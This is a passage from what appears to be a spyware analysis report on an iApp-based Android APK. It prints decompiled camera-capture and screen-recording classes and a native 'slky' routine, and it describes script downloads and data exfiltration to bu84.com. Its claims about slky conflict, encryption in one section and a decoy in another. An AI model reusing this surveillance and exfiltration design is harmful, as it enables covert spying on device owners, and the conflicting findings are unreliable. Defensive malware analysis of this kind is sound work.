        this.k = 90;
        this.l = 90;
        this.m = 95;
        this.n = null;
        this.p = new b();
        this.q = new c();
        this.b = context;
        this.a = activity;
        this.f1946c = surfaceView;
        this.j = z;
        this.k = i2;
        this.o = c.b.a.a.r.c(((Object[]) surfaceView.getTag())[2].toString(), "<eventItme type=\"onpicturecallback\">", "</eventItme>");
        s();
    }

    public m(Context context, Activity activity, SurfaceView surfaceView, boolean z, int i2, int i3, int i4, int i5) {
        this.a = null;
        this.b = null;
        this.e = -1;
        this.f = -1;
        this.g = null;
        this.h = false;
        this.f1948i = false;
        this.j = false;
        this.k = 90;
        this.l = 90;
        this.m = 95;
        this.n = null;
        this.p = new b();
        this.q = new c();
        this.b = context;
        this.a = activity;
        this.f1946c = surfaceView;
        this.j = z;
        this.k = i2;
        this.e = i3;
        this.f = i4;
        this.m = i5;
        this.o = c.b.a.a.r.c(((Object[]) surfaceView.getTag())[2].toString(), "<eventItme type=\"onpicturecallback\">", "</eventItme>");
        s();
    }

    private void A(Camera camera) {
        Camera.Parameters parameters;
        if (camera == null || (parameters = camera.getParameters()) == null) {
            return;
        }
        List<String> supportedFlashModes = parameters.getSupportedFlashModes();
        String flashMode = parameters.getFlashMode();
        if (supportedFlashModes == null || "off".equals(flashMode) || !supportedFlashModes.contains("off")) {
            return;
        }
        parameters.setFlashMode("off");
        camera.setParameters(parameters);
    }

    private void B(Camera camera) {
        Camera.Parameters parameters;
        List<String> supportedFlashModes;
        if (camera == null || (parameters = camera.getParameters()) == null || (supportedFlashModes = parameters.getSupportedFlashModes()) == null || "torch".equals(parameters.getFlashMode()) || !supportedFlashModes.contains("torch")) {
            return;
        }
        parameters.setFlashMode("torch");
        camera.setParameters(parameters);
    }

    @TargetApi(9)
    private int a() {
        Camera.CameraInfo cameraInfo = new Camera.CameraInfo();
        int numberOfCameras = Camera.getNumberOfCameras();
        for (int i2 = 0; i2 < numberOfCameras; i2++) {
            Camera.getCameraInfo(i2, cameraInfo);
            if (cameraInfo.facing == 0) {
                return i2;
            }
        }
        return -1;
    }

    @TargetApi(9)
    private int b() {
        Camera.CameraInfo cameraInfo = new Camera.CameraInfo();
        int numberOfCameras = Camera.getNumberOfCameras();
        for (int i2 = 0; i2 < numberOfCameras; i2++) {
            Camera.getCameraInfo(i2, cameraInfo);
            if (cameraInfo.facing == 1) {
                return i2;
            }
        }
        return -1;
    }

    private void s() {
        SurfaceHolder holder = this.f1946c.getHolder();
        this.f1947d = holder;
        holder.addCallback(new a());
    }

    /* JADX INFO: Access modifiers changed from: private */
    @TargetApi(9)
    public void t() throws IOException {
        int i2;
        int i3;
        if (!this.h) {
            int iB = this.j ? b() : a();
            if (iB == -1) {
                return;
            }
            Camera cameraOpen = Camera.open(iB);
            this.g = cameraOpen;
            cameraOpen.setDisplayOrientation(this.k);
        }
        Camera camera = this.g;
        if (camera == null || this.h) {
            return;
        }
        try {
            Camera.Parameters parameters = camera.getParameters();
            int i4 = this.e;
            if (i4 != -1 && (i3 = this.f) != -1) {
                parameters.setPreviewSize(i4, i3);
            }
            parameters.setPreviewFpsRange(4, 10);
            parameters.setPictureFormat(256);
            parameters.set("jpeg-quality", this.m);
            int i5 = this.e;
            if (i5 != -1 && (i2 = this.f) != -1) {
                parameters.setPictureSize(i5, i2);
            }
            this.g.setPreviewDisplay(this.f1947d);
            this.g.startPreview();
        } catch (Exception e) {
            e.printStackTrace();
        }
        this.h = true;
    }

    /* JADX INFO: Access modifiers changed from: private */
    public Bitmap v(int i2, Bitmap bitmap) {
        Bitmap bitmapCreateBitmap;
        Matrix matrix = new Matrix();
        matrix.postRotate(i2);
        try {
            bitmapCreateBitmap = Bitmap.createBitmap(bitmap, 0, 0, bitmap.getWidth(), bitmap.getHeight(), matrix, true);
        } catch (OutOfMemoryError unused) {
            bitmapCreateBitmap = null;
        }
        if (bitmapCreateBitmap == null) {
            bitmapCreateBitmap = bitmap;
        }
        if (bitmap != bitmapCreateBitmap) {
            bitmap.recycle();
        }
        return bitmapCreateBitmap;
    }

    public void q(String str, int i2, boolean z) {
        if (this.g != null) {
            c.b.a.a.e.b(str, false);
            this.n = str;
            this.l = i2;
            this.f1948i = z;
            this.g.autoFocus(this.p);
        }
    }

    public int r() {
        return this.k;
    }

    public void u() {
        Camera camera = this.g;
        if (camera != null) {
            if (this.h) {
                camera.stopPreview();
            }
            this.g.release();
            this.g = null;
        }
        this.h = false;
    }

    public void w(int i2) {
        this.k = i2;
        this.g.setDisplayOrientation(i2);
    }

    public void x(boolean z) {
        if (z) {
            B(this.g);
        } else {
            A(this.g);
        }
    }

    public void y() {
        this.g.startPreview();
        this.h = true;
    }

    public void z() {
        this.g.stopPreview();
        this.h = false;
    }
}
```

```java
package com.iapp.app;

import android.annotation.TargetApi;
import android.app.Activity;
import android.content.Context;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.Matrix;
import android.hardware.Camera;
import android.view.SurfaceHolder;
import android.view.SurfaceView;
import c.b.a.a.w;
import com.iapp.app.run.mian;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.util.List;

/* loaded from: /home/pana/dev/jadx-1.5.3/20260120_source_apk/classes.dex */
public class m {
    private Activity a;
    private Context b;

    /* renamed from: c, reason: collision with root package name */
    private SurfaceView f1946c;

    /* renamed from: d, reason: collision with root package name */
    private SurfaceHolder f1947d;
    private int e;
    private int f;
    private Camera g;
    private boolean h;

    /* renamed from: i, reason: collision with root package name */
    private boolean f1948i;
    private boolean j;
    private int k;
    private int l;
    private int m;
    private String n;
    private String o;
    Camera.AutoFocusCallback p;
    Camera.PictureCallback q;

    class a implements SurfaceHolder.Callback {
        a() {
        }

        @Override // android.view.SurfaceHolder.Callback
        public void surfaceChanged(SurfaceHolder surfaceHolder, int i2, int i3, int i4) {
        }

        @Override // android.view.SurfaceHolder.Callback
        public void surfaceCreated(SurfaceHolder surfaceHolder) throws IOException {
            m.this.t();
        }

        @Override // android.view.SurfaceHolder.Callback
        public void surfaceDestroyed(SurfaceHolder surfaceHolder) {
            if (m.this.g != null) {
                if (m.this.h) {
                    m.this.g.stopPreview();
                }
                m.this.g.release();
                m.this.g = null;
            }
            m.this.h = false;
        }
    }

    class b implements Camera.AutoFocusCallback {

        class a implements Camera.ShutterCallback {
            a(b bVar) {
            }

            @Override // android.hardware.Camera.ShutterCallback
            public void onShutter() {
            }
        }

        /* renamed from: com.iapp.app.m$b$b, reason: collision with other inner class name */
        class C0063b implements Camera.PictureCallback {
            C0063b(b bVar) {
            }

            @Override // android.hardware.Camera.PictureCallback
            public void onPictureTaken(byte[] bArr, Camera camera) {
            }
        }

        b() {
        }

        @Override // android.hardware.Camera.AutoFocusCallback
        public void onAutoFocus(boolean z, Camera camera) {
            if (z) {
                camera.takePicture(new a(this), new C0063b(this), m.this.q);
            }
        }
    }

    class c implements Camera.PictureCallback {
        c() {
        }

        @Override // android.hardware.Camera.PictureCallback
        public void onPictureTaken(byte[] bArr, Camera camera) throws Throwable {
            Bitmap bitmapDecodeByteArray;
            if (m.this.l != 0) {
                m mVar = m.this;
                bitmapDecodeByteArray = mVar.v(mVar.l, BitmapFactory.decodeByteArray(bArr, 0, bArr.length));
            } else {
                bitmapDecodeByteArray = BitmapFactory.decodeByteArray(bArr, 0, bArr.length);
            }
            try {
                FileOutputStream fileOutputStream = new FileOutputStream(new File(m.this.n));
                bitmapDecodeByteArray.compress(Bitmap.CompressFormat.JPEG, m.this.m, fileOutputStream);
                fileOutputStream.close();
            } catch (IOException e) {
                e.printStackTrace();
            }
            boolean z = m.this.f1948i;
            camera.stopPreview();
            if (z) {
                m.this.h = false;
            } else {
                camera.startPreview();
                m.this.h = true;
            }
            if (m.this.n == null || m.this.o == null) {
                return;
            }
            if (mian.sh) {
                w wVar = new w(m.this.b, m.this.a);
                wVar.S("st_vId", Integer.valueOf(m.this.f1946c.getId()));
                wVar.S("st_vW", m.this.f1946c);
                wVar.S("st_oS", this);
                wVar.S("st_fN", m.this.n);
                wVar.e(m.this.o);
                return;
            }
            Aid_YuCodeX aid_YuCodeX = new Aid_YuCodeX(m.this.b, m.this.a);
            aid_YuCodeX.dim("st_vId", Integer.valueOf(m.this.f1946c.getId()));
            aid_YuCodeX.dim("st_vW", m.this.f1946c);
            aid_YuCodeX.dim("st_oS", this);
            aid_YuCodeX.dim("st_fN", m.this.n);
            aid_YuCodeX.YuGoX(m.this.o);
        }
    }

    public m(Context context, Activity activity, SurfaceView surfaceView, boolean z, int i2) {
        this.a = null;
        this.b = null;
        this.e = -1;
        this.f = -1;
        this.g = null;
        this.h = false;
        this.f1948i = false;
        this.j = false;
        this.k = 90;
        this.l = 90;
        this.m = 95;
        this.n = null;
        this.p = new b();
        this.q = new c();
        this.b = context;
        this.a = activity;
        this.f1946c = surfaceView;
        this.j = z;
        this.k = i2;
        this.o = c.b.a.a.r.c(((Object[]) surfaceView.getTag())[2].toString(), "<eventItme type=\"onpicturecallback\">", "</eventItme>");
        s();
    }

    public m(Context context, Activity activity, SurfaceView surfaceView, boolean z, int i2, int i3, int i4, int i5) {
        this.a = null;
        this.b = null;
        this.e = -1;
        this.f = -1;
        this.g = null;
        this.h = false;
        this.f1948i = false;
        this.j = false;
        this.k = 90;
        this.l = 90;
        this.m = 95;
        this.n = null;
        this.p = new b();
        this.q = new c();
        this.b = context;
        this.a = activity;
        this.f1946c = surfaceView;
        this.j = z;
        this.k = i2;
        this.e = i3;
        this.f = i4;
        this.m = i5;
        this.o = c.b.a.a.r.c(((Object[]) surfaceView.getTag())[2].toString(), "<eventItme type=\"onpicturecallback\">", "</eventItme>");
        s();
    }

    private void A(Camera camera) {
        Camera.Parameters parameters;
        if (camera == null || (parameters = camera.getParameters()) == null) {
            return;
        }
        List<String> supportedFlashModes = parameters.getSupportedFlashModes();
        String flashMode = parameters.getFlashMode();
        if (supportedFlashModes == null || "off".equals(flashMode) || !supportedFlashModes.contains("off")) {
            return;
        }
        parameters.setFlashMode("off");
        camera.setParameters(parameters);
    }

    private void B(Camera camera) {
        Camera.Parameters parameters;
        List<String> supportedFlashModes;
        if (camera == null || (parameters = camera.getParameters()) == null || (supportedFlashModes = parameters.getSupportedFlashModes()) == null || "torch".equals(parameters.getFlashMode()) || !supportedFlashModes.contains("torch")) {
            return;
        }
        parameters.setFlashMode("torch");
        camera.setParameters(parameters);
    }

    @TargetApi(9)
    private int a() {
        Camera.CameraInfo cameraInfo = new Camera.CameraInfo();
        int numberOfCameras = Camera.getNumberOfCameras();
        for (int i2 = 0; i2 < numberOfCameras; i2++) {
            Camera.getCameraInfo(i2, cameraInfo);
            if (cameraInfo.facing == 0) {
                return i2;
            }
        }
        return -1;
    }

    @TargetApi(9)
    private int b() {
        Camera.CameraInfo cameraInfo = new Camera.CameraInfo();
        int numberOfCameras = Camera.getNumberOfCameras();
        for (int i2 = 0; i2 < numberOfCameras; i2++) {
            Camera.getCameraInfo(i2, cameraInfo);
            if (cameraInfo.facing == 1) {
                return i2;
            }
        }
        return -1;
    }

    private void s() {
        SurfaceHolder holder = this.f1946c.getHolder();
        this.f1947d = holder;
        holder.addCallback(new a());
    }

    /* JADX INFO: Access modifiers changed from: private */
    @TargetApi(9)
    public void t() throws IOException {
        int i2;
        int i3;
        if (!this.h) {
            int iB = this.j ? b() : a();
            if (iB == -1) {
                return;
            }
            Camera cameraOpen = Camera.open(iB);
            this.g = cameraOpen;
            cameraOpen.setDisplayOrientation(this.k);
        }
        Camera camera = this.g;
        if (camera == null || this.h) {
            return;
        }
        try {
            Camera.Parameters parameters = camera.getParameters();
            int i4 = this.e;
            if (i4 != -1 && (i3 = this.f) != -1) {
                parameters.setPreviewSize(i4, i3);
            }
            parameters.setPreviewFpsRange(4, 10);
            parameters.setPictureFormat(256);
            parameters.set("jpeg-quality", this.m);
            int i5 = this.e;
            if (i5 != -1 && (i2 = this.f) != -1) {
                parameters.setPictureSize(i5, i2);
            }
            this.g.setPreviewDisplay(this.f1947d);
            this.g.startPreview();
        } catch (Exception e) {
            e.printStackTrace();
        }
        this.h = true;
    }

    /* JADX INFO: Access modifiers changed from: private */
    public Bitmap v(int i2, Bitmap bitmap) {
        Bitmap bitmapCreateBitmap;
        Matrix matrix = new Matrix();
        matrix.postRotate(i2);
        try {
            bitmapCreateBitmap = Bitmap.createBitmap(bitmap, 0, 0, bitmap.getWidth(), bitmap.getHeight(), matrix, true);
        } catch (OutOfMemoryError unused) {
            bitmapCreateBitmap = null;
        }
        if (bitmapCreateBitmap == null) {
            bitmapCreateBitmap = bitmap;
        }
        if (bitmap != bitmapCreateBitmap) {
            bitmap.recycle();
        }
        return bitmapCreateBitmap;
    }

    public void q(String str, int i2, boolean z) {
        if (this.g != null) {
            c.b.a.a.e.b(str, false);
            this.n = str;
            this.l = i2;
            this.f1948i = z;
            this.g.autoFocus(this.p);
        }
    }

    public int r() {
        return this.k;
    }

    public void u() {
        Camera camera = this.g;
        if (camera != null) {
            if (this.h) {
                camera.stopPreview();
            }
            this.g.release();
            this.g = null;
        }
        this.h = false;
    }

    public void w(int i2) {
        this.k = i2;
        this.g.setDisplayOrientation(i2);
    }

    public void x(boolean z) {
        if (z) {
            B(this.g);
        } else {
            A(this.g);
        }
    }

    public void y() {
        this.g.startPreview();
        this.h = true;
    }

    public void z() {
        this.g.stopPreview();
        this.h = false;
    }
}
```

```java
package com.iapp.app;

import android.annotation.SuppressLint;
import android.app.Activity;
import android.content.Intent;
import android.hardware.display.VirtualDisplay;
import android.media.MediaRecorder;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.os.Environment;
import android.util.DisplayMetrics;
import java.io.IOException;

@SuppressLint({"NewApi"})
/* loaded from: /home/pana/dev/jadx-1.5.3/20260120_source_apk/classes.dex */
public class p {
    public static p n;
    private Activity b;
    private MediaProjectionManager h;

    /* renamed from: i, reason: collision with root package name */
    private MediaProjection f1956i;
    private VirtualDisplay j;
    private b k;
    private int l;
    private MediaRecorder m;
    private boolean a = false;

    /* renamed from: c, reason: collision with root package name */
    private String f1954c = Environment.getExternalStorageDirectory().toString() + "/iapp.mp4";

    /* renamed from: d, reason: collision with root package name */
    private int f1955d = 1280;
    private int e = 720;
    private int f = 1024000;
    private int g = 30;

    private final class b extends MediaProjection.Callback {
        private b() {
        }

        @Override // android.media.projection.MediaProjection.Callback
        public void onStop() throws IllegalStateException {
            super.onStop();
            if (p.this.a) {
                p.this.a = false;
                p.this.r();
                p.this.j.release();
                p.this.f1956i.stop();
                p.this.f1956i.unregisterCallback(p.this.k);
                p.this.f1956i = null;
            }
        }
    }

    public p(Activity activity) {
        this.b = activity;
    }

    private VirtualDisplay h() {
        return this.f1956i.createVirtualDisplay("MainActivity", this.f1955d, this.e, this.l, 16, this.m.getSurface(), null, null);
    }

    private void k() {
        DisplayMetrics displayMetrics = new DisplayMetrics();
        this.b.getWindowManager().getDefaultDisplay().getMetrics(displayMetrics);
        this.l = displayMetrics.densityDpi;
    }

    private void l(String str) throws IllegalStateException {
        this.m.setAudioSource(1);
        this.m.setVideoSource(2);
        this.m.setOutputFormat(2);
        this.m.setVideoEncoder(2);
        this.m.setAudioEncoder(1);
        this.m.setVideoEncodingBitRate(this.f);
        this.m.setVideoFrameRate(this.g);
        this.m.setVideoSize(this.f1955d, this.e);
        this.m.setOutputFile(str);
    }

    private void q() throws IllegalStateException, IOException {
        try {
            this.m.prepare();
        } catch (IOException e) {
            e.printStackTrace();
            this.b.finish();
        }
    }

    /* JADX INFO: Access modifiers changed from: private */
    public void r() throws IllegalStateException {
        this.m.stop();
        this.m.reset();
    }

    public boolean i() {
        return this.a;
    }

    public void j(String str, int i2, int i3, int i4, int i5) {
        this.f1954c = str;
        this.f1955d = i2;
        this.e = i3;
        this.f = i4;
        this.g = i5;
    }

    public void m(int i2, int i3, Intent intent) throws IllegalStateException {
        if (i2 != 1103) {
            this.a = false;
            return;
        }
        if (i3 != -1) {
            this.a = false;
            return;
        }
        MediaProjection mediaProjection = this.h.getMediaProjection(i3, intent);
        this.f1956i = mediaProjection;
        mediaProjection.registerCallback(this.k, null);
        this.j = h();
        this.m.start();
    }

    public void n(String str, int i2, int i3, int i4, int i5) {
        this.f1954c = str;
        this.f1955d = i2;
        this.e = i3;
        this.f = i4;
        this.g = i5;
        k();
        this.h = (MediaProjectionManager) this.b.getSystemService("media_projection");
        this.m = new MediaRecorder();
        this.k = new b();
    }

    public void o() {
        if (this.a) {
            this.a = false;
        }
        MediaRecorder mediaRecorder = this.m;
        if (mediaRecorder != null) {
            mediaRecorder.release();
            this.m = null;
        }
        VirtualDisplay virtualDisplay = this.j;
        if (virtualDisplay != null) {
            virtualDisplay.release();
            this.j = null;
        }
        MediaProjection mediaProjection = this.f1956i;
        if (mediaProjection != null) {
            mediaProjection.unregisterCallback(this.k);
            this.f1956i.stop();
            this.f1956i = null;
        }
    }

    public void p(boolean z) throws IllegalStateException, IOException {
        this.a = z;
        if (!z) {
            r();
            this.j.release();
            return;
        }
        l(this.f1954c);
        q();
        if (this.f1956i == null) {
            this.b.startActivityForResult(new Intent(this.h.createScreenCaptureIntent()), 1103);
        } else {
            this.j = h();
            this.m.start();
        }
    }
}
```

```java
package com.iapp.app;

import android.content.Context;
import android.speech.tts.TextToSpeech;
import java.util.Locale;

/* loaded from: /home/pana/dev/jadx-1.5.3/20260120_source_apk/classes.dex */
public class r {
    private TextToSpeech a;
    private int b = 0;

    class a implements TextToSpeech.OnInitListener {
        a() {
        }

        @Override // android.speech.tts.TextToSpeech.OnInitListener
        public void onInit(int i2) {
            if (i2 != 0) {
                r.this.b = -1;
            }
        }
    }

    class b implements TextToSpeech.OnInitListener {
        final /* synthetic */ String a;
        final /* synthetic */ float b;

        /* renamed from: c, reason: collision with root package name */
        final /* synthetic */ float f1960c;

        /* renamed from: d, reason: collision with root package name */
        final /* synthetic */ String f1961d;

        b(String str, float f, float f2, String str2) {
            this.a = str;
            this.b = f;
            this.f1960c = f2;
            this.f1961d = str2;
        }

        @Override // android.speech.tts.TextToSpeech.OnInitListener
        public void onInit(int i2) {
            if (i2 != 0) {
                r.this.b = -1;
                return;
            }
            int language = r.this.a.setLanguage(new Locale(this.a));
            if (language == -1 || language == -2) {
                r.this.b = -2;
                return;
            }
            r.this.b = 1;
            r.this.a.setSpeechRate(this.b);
            r.this.a.setPitch(this.f1960c);
            r.this.a.speak(this.f1961d, 0, null);
        }
    }

    public r(Context context) {
        this.a = new TextToSpeech(context, new a());
    }

    public r(Context context, String str, String str2, float f, float f2) {
        this.a = new TextToSpeech(context, new b(str, f, f2, str2));
    }

    public int c() {
        return this.b;
    }

    public boolean d() {
        return this.a.isSpeaking();
    }

    public void e(String str) {
        int language = this.a.setLanguage(new Locale(str));
        if (language == -1 || language == -2) {
            this.b = -2;
        } else {
            this.b = 1;
        }
    }

    public void f(float f) {
        this.a.setPitch(0.5f);
    }

    public void g(float f) {
        this.a.setSpeechRate(0.5f);
    }

    public void h() {
        this.a.shutdown();
    }

    public boolean i(String str, int i2) {
        return this.a.speak(str, i2, null) != -1;
    }

    public boolean j() {
        return this.a.stop() != -1;
    }

    public boolean k(String str, String str2) {
        return this.a.synthesizeToFile(str, null, str2) != -1;
    }
}
```

### **6.3. Dynamic Code Execution (The Lua-Java Bridge)**

The use of `libluajava.so` represents a high-tier threat level.

* **Reflective Orchestration:** Lua scripts can call any Java method in the Android OS via reflection.
* **Payload Agility:** If a specific banking app is updated with new security, the attacker does not need to update the APK. They simply upload a new `.ilua` script to `bu84.com`, which is downloaded and executed by the native engine to adapt the attack in real-time.

### **6.4. Data Exfiltration Protocol**

The exfiltration process is designed to look like standard telemetry:

1. **Packaging:** Stolen data (SMS, Contacts, Photos) is compressed into a temporary `.dat` or `.tmp` file.
2. **Encryption:** The data is encrypted using the same `slky` algorithm found in the native layer to prevent Network Intrusion Detection Systems (NIDS) from seeing the stolen content.
3. **POST Request:** The data is sent via an HTTP POST request to `bu84.com/config.php` with a fake `User-Agent` string mimicking a common web browser or the UE4 engine's update service.

---

## **7. Forensic Summary of Targeted Data**

| Data Category | Extraction Method | Frequency |
| --- | --- | --- |
| **User Identity** | IMEI, IMSI, SIM Serial via `TelephonyManager` | Once per Boot |
| **Communication** | SMS interception and Call Log scraping | Real-time |
| **Environmental** | Background Mic Recording and Front Camera Snapshots | Trigger-based |
| **Credentials** | Keylogging via Accessibility Services | Continuous |

---

## **8. Concluding Analyst Note**

The YGS-packer family is a classic example of "Living off the Land" in Android. By using a legitimate framework (iApp) and legitimate libraries (UE4, LuaJava), the attacker creates a noise-floor that hides the signal of the malware. The transition from Java to Native C++ for the core decryption is the "Gordian Knot" intended to stop 99% of automated analysis tools.

The [YGS-2026-01] threat is a high-risk spyware variant. It is recommended that any device containing the `libygsiyu.so` or `libluajava.so` signatures be considered fully compromised.

---

## **9. Technical Appendix**

1. **Original Filename:** `刷 刀 体 质.apk`
2. **SHA-256 Hash:** `f04990c4f191a8890d35a28f7aa4b5db3965ae18053ba9c1bf554a6719112657`
3. **MD-5 Hash:** `74acf9985cf93b8c7d78c2b0ea679b64` 
4. **SHA-1 Hash:** `9b3311985120b00bb95048496eefbdaff762f5dd`
5. **Recieve Method:** User Report
6. **Link:** `https://www.virustotal.com/gui/file/f04990c4f191a8890d35a28f7aa4b5db3965ae18053ba9c1bf554a6719112657/detection`

---

## **10. Summarize**

### 1. File Signatures & Masquerade

The app uses a dual-masquerade technique to hide its true purpose:

* **Primary Masquerade:** Unreal Engine 4 (UE4).
* **Evidence:** `assets/res/hz/16/1.sav` starts with `GVAS` (`47 56 41 53`).
* **Configuration:** `UserSettings.ini` contains standard UE4 CVars (WaterReflection, SoundQuality).


* **Secondary Framework:** iApp (Chinese Rapid Dev Tool).
* **Evidence:** `libygsiyu.so` and `com.iapp.app` namespace in `classes.dex`.
* **Scripting:** `libluajava.so` indicates logic is likely in Lua scripts (unverified location).



### 2. Payload Inventory (The `lib/` folder)

The app utilizes "Library-as-Payload" storage to hide DEX files from standard scanners.

It uses Java Protector or Unpacker to protect the payloads.

| Filename | Type | Detected Logic / Responsibility |
| --- | --- | --- |
| `lengtong.dex` | Java DEX | **Data Access:** Filesystem manipulation (`AndroidData.java`) and binary patching (`HexEdit.java`). |
| `lengtong2.dex` | Java DEX | **Persistence/Protection:** Numbered classes (`C0005.java`) suggest a custom unpacker or string decrypter. |
| `classes2.dex` | Java DEX | **Surveillance:** Contains `ADRT` (Android Remote Debugger Tool) for LogCat monitoring. |
| `Compression.dex` | Java DEX | **Exfiltration Prep:** Uses `Zip4j` for archiving and potentially encrypting stolen data. |

### 3. Decoy Mechanism ("slky")

* **Status:** Confirmed Decoy / Red Herring.
* **Behavior:** The native `slky` XOR function appears to be dead code or a diversion. Attempting to use it on assets results in a sequential `00 01 02 03` header, indicating a mathematical loop trap designed to waste investigator time.
* The decrypted assets/lib.so could be got from `/data/data/[pkg]/files/_RunDex_/` (which is the tmp folder used by the malware) using Frida. But we are not sure if assets/lib.so is another decoy file.

```text
/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */
/* iapp::slky(iapp::Interact*, _jbyteArray*, _jbyteArray*) */

void iapp::slky(long param_1,undefined8 param_2,long param_3,undefined8 param_4,undefined8 param_5,
               undefined8 param_6,undefined8 param_7,undefined8 param_8)

{
  char *pcVar1;
  undefined1 *puVar2;
  int iVar3;
  char cVar4;
  byte bVar5;
  uint uVar6;
  int iVar7;
  int iVar8;
  char *pcVar9;
  int *extraout_x0;
  undefined8 extraout_x0_00;
  void *__s;
  size_t sVar10;
  undefined8 *puVar11;
  undefined8 uVar12;
  undefined8 uVar13;
  undefined8 extraout_x0_01;
  undefined8 extraout_x0_02;
  void *__s_00;
  void *__s_01;
  uint uVar14;
  byte bVar15;
  undefined8 uVar16;
  int iVar17;
  code *pcVar18;
  undefined8 *puVar19;
  long lVar20;
  byte bVar21;
  long lVar22;
  long *plVar23;
  char cVar24;
  undefined8 uVar25;
  undefined1 auVar26 [16];
  byte local_38 [24];
  byte local_20;
  char local_1f [15];
  char *local_10;
  long local_8;
  
  uVar16 = 0;
  local_8 = ___stack_chk_guard;
  pcVar18 = *(code **)(**(long **)(param_1 + 8) + 0x5c0);
  lVar22 = ___stack_chk_guard;
  auVar26 = (*pcVar18)(*(long **)(param_1 + 8));
  pcVar9 = auVar26._0_8_;
  operator.new(0x18,auVar26._8_8_,uVar16,pcVar18,lVar22,param_6,param_7,param_8);
  *extraout_x0 = 0;
  extraout_x0[1] = 2;
                    /* try { // try from 00109d54 to 00109d57 has its CatchHandler @ 0010a624 */
  operator.new[](2);
  *(undefined8 *)(extraout_x0 + 4) = extraout_x0_00;
  iVar7 = (**(code **)(**(long **)(param_1 + 8) + 0x558))(*(long **)(param_1 + 8),param_2);
  cVar24 = *pcVar9;
  bVar15 = pcVar9[(long)iVar7 + -1];
  iVar8 = iVar7;
  if (0 < iVar7) {
    iVar17 = *extraout_x0;
    lVar22 = 0;
    do {
      while( true ) {
        cVar4 = pcVar9[lVar22];
        iVar8 = iVar8 + cVar4;
        if (extraout_x0[1] != iVar17) break;
        iVar17 = iVar17 << 1;
        operator.new[]((long)iVar17);
        memset(__s,0,(long)iVar17);
        memcpy(__s,*(void **)(extraout_x0 + 4),(long)*extraout_x0);
        if (*(void **)(extraout_x0 + 4) != (void *)0x0) {
          operator.delete[](*(void **)(extraout_x0 + 4));
        }
        extraout_x0[1] = iVar17;
        lVar22 = lVar22 + 1;
        *(void **)(extraout_x0 + 4) = __s;
        *(char *)((long)__s + (long)*extraout_x0) = cVar4;
        iVar17 = *extraout_x0 + 1;
        *extraout_x0 = iVar17;
        if (iVar7 <= (int)lVar22) goto LAB_00109e48;
      }
      lVar22 = lVar22 + 1;
      *(char *)(*(long *)(extraout_x0 + 4) + (long)iVar17) = cVar4;
      iVar17 = *extraout_x0 + 1;
      *extraout_x0 = iVar17;
    } while ((int)lVar22 < iVar7);
  }
LAB_00109e48:
  (**(code **)(**(long **)(param_1 + 8) + 0x600))(*(long **)(param_1 + 8),param_2,pcVar9,0);
  bVar21 = 0;
  if (iVar7 != 0) {
    bVar21 = (byte)(iVar8 / iVar7);
  }
  uVar6 = 0;
  if (iVar7 != 0) {
    uVar6 = (int)(iVar8 + (uint)bVar15 * (int)cVar24) / iVar7;
  }
  cVar24 = (char)iVar8 - bVar21 * (char)iVar7;
  std::to_string((ulong *)&local_20,uVar6);
  pcVar9 = local_10;
  if ((local_20 & 1) == 0) {
    pcVar9 = local_1f;
  }
  sVar10 = strlen(pcVar9);
  iVar8 = (int)sVar10;
  if (extraout_x0[1] <= *extraout_x0 + iVar8) {
    iVar7 = extraout_x0[1] + iVar8;
    extraout_x0[1] = iVar7;
    iVar7 = iVar7 * 2;
    operator.new[]((long)iVar7);
    memset(__s_00,0,(long)iVar7);
    memcpy(__s_00,*(void **)(extraout_x0 + 4),(long)*extraout_x0);
    if (*(void **)(extraout_x0 + 4) != (void *)0x0) {
      operator.delete[](*(void **)(extraout_x0 + 4));
    }
    extraout_x0[1] = iVar7;
    *(void **)(extraout_x0 + 4) = __s_00;
  }
  if (0 < iVar8) {
    iVar7 = *extraout_x0;
    lVar22 = 0;
    do {
      pcVar1 = pcVar9 + lVar22;
      lVar22 = lVar22 + 1;
      *(char *)(*(long *)(extraout_x0 + 4) + (long)iVar7) = *pcVar1;
      iVar7 = *extraout_x0 + 1;
      *extraout_x0 = iVar7;
    } while ((int)lVar22 < iVar8);
  }
  if (param_3 != 0) {
                    /* try { // try from 00109f10 to 0010a5e3 has its CatchHandler @ 0010a638 */
    iVar8 = (**(code **)(**(long **)(param_1 + 8) + 0x558))(*(long **)(param_1 + 8),param_3);
    lVar22 = (**(code **)(**(long **)(param_1 + 8) + 0x5c0))(*(long **)(param_1 + 8),param_3,0);
    if (extraout_x0[1] <= iVar8 + *extraout_x0) {
      iVar7 = iVar8 + extraout_x0[1];
      extraout_x0[1] = iVar7;
      iVar7 = iVar7 * 2;
      operator.new[]((long)iVar7);
      memset(__s_01,0,(long)iVar7);
      memcpy(__s_01,*(void **)(extraout_x0 + 4),(long)*extraout_x0);
      if (*(void **)(extraout_x0 + 4) != (void *)0x0) {
        operator.delete[](*(void **)(extraout_x0 + 4));
      }
      extraout_x0[1] = iVar7;
      *(void **)(extraout_x0 + 4) = __s_01;
    }
    if (0 < iVar8) {
      iVar7 = *extraout_x0;
      lVar20 = 0;
      do {
        puVar2 = (undefined1 *)(lVar22 + lVar20);
        lVar20 = lVar20 + 1;
        *(undefined1 *)(*(long *)(extraout_x0 + 4) + (long)iVar7) = *puVar2;
        iVar7 = *extraout_x0 + 1;
        *extraout_x0 = iVar7;
      } while ((int)lVar20 < iVar8);
    }
    (**(code **)(**(long **)(param_1 + 8) + 0x600))(*(long **)(param_1 + 8),param_3,lVar22,0);
    cVar24 = cVar24 + (char)iVar8;
  }
  plVar23 = *(long **)(param_1 + 8);
  iVar8 = *extraout_x0;
  uVar25 = *(undefined8 *)(extraout_x0 + 4);
  uVar16 = (**(code **)(*plVar23 + 0x580))(plVar23,iVar8);
  (**(code **)(*plVar23 + 0x680))(plVar23,uVar16,0,iVar8,uVar25);
  operator.delete(*(void **)(extraout_x0 + 4));
  operator.delete(extraout_x0);
  puVar11 = (undefined8 *)
            (**(code **)(**(long **)(param_1 + 8) + 0x5c0))(*(long **)(param_1 + 8),uVar16,0);
  iVar8 = (**(code **)(**(long **)(param_1 + 8) + 0x558))(*(long **)(param_1 + 8),uVar16);
  if (0 < iVar8) {
    uVar6 = (iVar8 - 0x10U >> 4) + 1;
    iVar7 = uVar6 * 0x10;
    if (iVar8 - 1U < 0xf) {
      iVar7 = 0;
    }
    else {
      uVar14 = 0;
      puVar19 = puVar11;
      do {
